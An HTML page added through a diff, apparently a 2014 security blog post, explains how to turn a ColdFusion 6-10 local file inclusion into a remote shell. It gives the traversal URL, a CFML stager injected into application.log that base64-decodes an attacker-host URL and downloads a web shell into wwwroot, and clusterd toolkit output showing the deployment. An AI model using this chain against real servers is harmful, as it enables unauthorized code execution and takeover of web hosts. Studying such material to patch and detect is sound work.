@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>LFI to shell in Coldfusion 6-10</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>LFI to shell in Coldfusion 6-10</h1>
+			<b><time>2014-04-02</time></b>
+		       
+
+			<div>
+				<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>
+<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>
+<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>
+<pre tabindex="0"><code>http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en
+</code></pre><p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>
+<figure><img src="/images/posts/2014/cf_log.jpg"/>
+</figure>
+
+<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>
+<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>
+<pre tabindex="0"><code>&lt;cfhttp method=&#39;get&#39; url=&#39;#ToString(ToBinary(&#39;aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s&#39;))#&#39; path=&#39;#ExpandPath(ToString(ToBinary(&#39;Li4vLi4v&#39;)))#&#39; file=&#39;cmd.cfml&#39;&gt;
+</code></pre><p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>
+<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>
+<figure><img src="/images/posts/2014/cf_log_fetch.jpg"/>
+</figure>
+
+<p>Which we can then access from the root directory:</p>
+<figure><img src="/images/posts/2014/cf_log_exec.jpg"/>
+</figure>
+
+<p>A quick run of this in clusterd:</p>
+<pre tabindex="0"><code>$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 --deployer lfi_stager --deploy ./src/lib/resources/cmd.cfml 
+
+        clusterd/0.2.1 - clustered attack toolkit
+            [Supporting 5 platforms]
+
+ [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
+ [2014-04-02 11:28PM] Servers&#39; OS hinted at windows
+ [2014-04-02 11:28PM] Fingerprinting host &#39;192.168.1.219&#39;
+ [2014-04-02 11:28PM] Server hinted at &#39;coldfusion&#39;
+ [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager...
+ [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
+ [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
+ [2014-04-02 11:28PM] Fingerprinting completed.
+ [2014-04-02 11:28PM] Injecting stager...
+ [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
+ [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
+ [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM
+</code></pre><p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>
+<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
